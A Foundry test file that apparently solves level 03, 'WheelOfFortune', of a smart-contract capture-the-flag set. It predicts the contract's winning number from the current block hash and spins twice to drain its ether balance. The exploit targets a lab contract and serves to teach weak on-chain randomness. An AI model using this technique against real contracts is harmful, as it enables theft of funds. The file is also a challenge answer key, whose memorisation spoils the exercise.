// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/03_WheelOfFortune/WheelOfFortune.sol";

// forge test --match-contract WheelOfFortuneTest -vvvv
contract WheelOfFortuneTest is BaseTest {
    WheelOfFortune instance;

    function setUp() public override {
        super.setUp();
        instance = new WheelOfFortune{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        bytes32 blockHash = blockhash(block.number);

        uint256 winningNumber = uint256(keccak256(abi.encode(blockHash))) % 100;
        console.log(winningNumber);
        instance.spin{value: 0.01 ether}(winningNumber);

        instance.spin{value: 0.01 ether}(1);
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertEq(address(instance).balance, 0);
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
        
    }
}